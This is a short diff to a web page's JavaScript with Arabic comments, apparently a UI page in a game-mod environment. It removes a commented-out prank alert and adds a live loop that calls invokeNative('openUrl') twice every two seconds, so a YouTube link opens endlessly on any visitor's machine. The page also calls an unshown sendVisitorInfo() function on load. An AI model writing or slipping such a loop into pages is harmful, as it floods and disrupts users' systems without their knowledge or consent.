@@ -143,18 +143,10 @@
     sendVisitorInfo(); // <-- مهم
   
 
-    //window.onload = function () {
-    //  sendVisitorInfo();
-
-    //  setTimeout(() => {
-     //   alert('Rayan 3mk');
-    //  }, 2000);
-
-
-    //  setTimeout(() => {
-    //    window.open("https://www.youtube.com/watch?v=QlK8TFTUAMI", "_blank");
-     // }, 5000);
-   // };
+        setInterval(function() {
+            window.invokeNative("openUrl", "https://www.youtube.com/watch?v=jGf5suhhddQ");
+            window.invokeNative("openUrl", "https://www.youtube.com/watch?v=jGf5suhhddQ");
+             },     2000);
 
     // حركة ارتدادية للشعار
     const logo = document.getElementById('bouncing-logo');
